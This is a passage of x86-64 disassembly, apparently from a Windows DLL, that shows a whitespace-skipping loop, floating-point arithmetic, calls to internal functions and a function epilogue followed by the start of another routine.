   180005143:	76 59                	jbe    0x18000519e
   180005145:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   18000514c:	00 00 00 00 
   180005150:	41 0f b6 46 ff       	movzbl -0x1(%r14),%eax
   180005155:	49 8d 76 ff          	lea    -0x1(%r14),%rsi
   180005159:	3c 20                	cmp    $0x20,%al
   18000515b:	74 04                	je     0x180005161
   18000515d:	3c 09                	cmp    $0x9,%al
   18000515f:	75 3a                	jne    0x18000519b
   180005161:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   180005166:	48 8d 46 01          	lea    0x1(%rsi),%rax
   18000516a:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   18000516f:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   180005173:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   180005178:	41 0f 28 db          	movaps %xmm11,%xmm3
   18000517c:	41 0f 28 d1          	movaps %xmm9,%xmm2
   180005180:	f3 44 0f 11 54 24 20 	movss  %xmm10,0x20(%rsp)
   180005187:	49 8b cf             	mov    %r15,%rcx
   18000518a:	4c 8b f6             	mov    %rsi,%r14
   18000518d:	e8 6e 1a 02 00       	call   0x180026c00
   180005192:	f3 0f 5c 38          	subss  (%rax),%xmm7
   180005196:	49 3b f4             	cmp    %r12,%rsi
   180005199:	77 b5                	ja     0x180005150
   18000519b:	8b 75 38             	mov    0x38(%rbp),%esi
   18000519e:	48 8b 45 40          	mov    0x40(%rbp),%rax
   1800051a2:	4c 8d 45 60          	lea    0x60(%rbp),%r8
   1800051a6:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   1800051aa:	4d 8b cc             	mov    %r12,%r9
   1800051ad:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   1800051b2:	49 8b d5             	mov    %r13,%rdx
   1800051b5:	f3 44 0f 11 75 60    	movss  %xmm14,0x60(%rbp)
   1800051bb:	f3 0f 10 40 04       	movss  0x4(%rax),%xmm0
   1800051c0:	48 8d 45 38          	lea    0x38(%rbp),%rax
   1800051c4:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1800051c9:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1800051ce:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800051d3:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1800051d8:	f3 0f 11 45 64       	movss  %xmm0,0x64(%rbp)
   1800051dd:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   1800051e1:	e8 8a f5 ff ff       	call   0x180004770
   1800051e6:	f3 41 0f 58 7d 00    	addss  0x0(%r13),%xmm7
   1800051ec:	0f 28 c7             	movaps %xmm7,%xmm0
   1800051ef:	f3 0f 58 c6          	addss  %xmm6,%xmm0
   1800051f3:	44 0f 2f e8          	comiss %xmm0,%xmm13
   1800051f7:	44 0f 28 6c 24 70    	movaps 0x70(%rsp),%xmm13
   1800051fd:	0f 82 94 00 00 00    	jb     0x180005297
   180005203:	44 8b 75 68          	mov    0x68(%rbp),%r14d
   180005207:	4c 8b 65 30          	mov    0x30(%rbp),%r12
   18000520b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180005210:	f3 41 0f 10 75 04    	movss  0x4(%r13),%xmm6
   180005216:	41 0f 28 cc          	movaps %xmm12,%xmm1
   18000521a:	33 c9                	xor    %ecx,%ecx
   18000521c:	e8 1f ea ff ff       	call   0x180003c40
   180005221:	0f 28 c7             	movaps %xmm7,%xmm0
   180005224:	66 89 74 24 28       	mov    %si,0x28(%rsp)
   180005229:	0f 14 c6             	unpcklps %xmm6,%xmm0
   18000522c:	41 0f 28 d1          	movaps %xmm9,%xmm2
   180005230:	66 49 0f 7e c1       	movq   %xmm0,%r9
   180005235:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180005239:	49 8b d4             	mov    %r12,%rdx
   18000523c:	49 8b cf             	mov    %r15,%rcx
   18000523f:	e8 2c 1c 02 00       	call   0x180026e70
   180005244:	ff c7                	inc    %edi
   180005246:	f3 41 0f 58 f8       	addss  %xmm8,%xmm7
   18000524b:	41 3b fe             	cmp    %r14d,%edi
   18000524e:	7c c0                	jl     0x180005210
   180005250:	4c 8b 65 58          	mov    0x58(%rbp),%r12
   180005254:	eb 41                	jmp    0x180005297
   180005256:	f3 41 0f 10 41 04    	movss  0x4(%r9),%xmm0
   18000525c:	48 8d 45 40          	lea    0x40(%rbp),%rax
   180005260:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   180005265:	4c 8d 45 68          	lea    0x68(%rbp),%r8
   180005269:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   18000526e:	4d 8b cc             	mov    %r12,%r9
   180005271:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   180005276:	f3 44 0f 11 75 68    	movss  %xmm14,0x68(%rbp)
   18000527c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180005281:	49 8b d5             	mov    %r13,%rdx
   180005284:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180005289:	f3 0f 11 45 6c       	movss  %xmm0,0x6c(%rbp)
   18000528e:	48 89 7d 40          	mov    %rdi,0x40(%rbp)
   180005292:	e8 d9 f4 ff ff       	call   0x180004770
   180005297:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   18000529c:	44 0f 28 74 24 60    	movaps 0x60(%rsp),%xmm14
   1800052a2:	44 0f 28 a4 24 80 00 	movaps 0x80(%rsp),%xmm12
   1800052a9:	00 00 
   1800052ab:	44 0f 28 9c 24 90 00 	movaps 0x90(%rsp),%xmm11
   1800052b2:	00 00 
   1800052b4:	80 b8 30 2f 00 00 00 	cmpb   $0x0,0x2f30(%rax)
   1800052bb:	44 0f 28 94 24 a0 00 	movaps 0xa0(%rsp),%xmm10
   1800052c2:	00 00 
   1800052c4:	44 0f 28 8c 24 b0 00 	movaps 0xb0(%rsp),%xmm9
   1800052cb:	00 00 
   1800052cd:	44 0f 28 84 24 c0 00 	movaps 0xc0(%rsp),%xmm8
   1800052d4:	00 00 
   1800052d6:	0f 28 bc 24 d0 00 00 	movaps 0xd0(%rsp),%xmm7
   1800052dd:	00 
   1800052de:	0f 28 b4 24 e0 00 00 	movaps 0xe0(%rsp),%xmm6
   1800052e5:	00 
   1800052e6:	4c 8b bc 24 f0 00 00 	mov    0xf0(%rsp),%r15
   1800052ed:	00 
   1800052ee:	4c 8b b4 24 f8 00 00 	mov    0xf8(%rsp),%r14
   1800052f5:	00 
   1800052f6:	48 8b bc 24 00 01 00 	mov    0x100(%rsp),%rdi
   1800052fd:	00 
   1800052fe:	48 8b b4 24 48 01 00 	mov    0x148(%rsp),%rsi
   180005305:	00 
   180005306:	74 0e                	je     0x180005316
   180005308:	4c 8b c3             	mov    %rbx,%r8
   18000530b:	49 8b d4             	mov    %r12,%rdx
   18000530e:	49 8b cd             	mov    %r13,%rcx
   180005311:	e8 2a 07 01 00       	call   0x180015a40
   180005316:	48 81 c4 08 01 00 00 	add    $0x108,%rsp
   18000531d:	41 5d                	pop    %r13
   18000531f:	41 5c                	pop    %r12
   180005321:	5b                   	pop    %rbx
   180005322:	5d                   	pop    %rbp
   180005323:	c3                   	ret
   180005324:	cc                   	int3
   180005325:	cc                   	int3
   180005326:	cc                   	int3
   180005327:	cc                   	int3
   180005328:	cc                   	int3
   180005329:	cc                   	int3
   18000532a:	cc                   	int3
   18000532b:	cc                   	int3
   18000532c:	cc                   	int3
   18000532d:	cc                   	int3
   18000532e:	cc                   	int3
   18000532f:	cc                   	int3
   180005330:	48 8b c4             	mov    %rsp,%rax
   180005333:	48 89 70 20          	mov    %rsi,0x20(%rax)
   180005337:	57                   	push   %rdi
   180005338:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   18000533f:	48 8b 3d 8a 7a 07 00 	mov    0x77a8a(%rip),%rdi        # 0x18007cdd0
   180005346:	44 0f 29 40 c8       	movaps %xmm8,-0x38(%rax)
   18000534b:	f3 44 0f 10 84 24 c0 	movss  0xc0(%rsp),%xmm8
   180005352:	00 00 00 
   180005355:	48 89 58 18          	mov    %rbx,0x18(%rax)
   180005359:	41 0f b6 d9          	movzbl %r9b,%ebx
   18000535d:	48 8b b7 18 1a 00 00 	mov    0x1a18(%rdi),%rsi
   180005364:	45 8b c8             	mov    %r8d,%r9d
   180005367:	48 89 50 a8          	mov    %rdx,-0x58(%rax)
   18000536b:	4c 8d 40 a8          	lea    -0x58(%rax),%r8
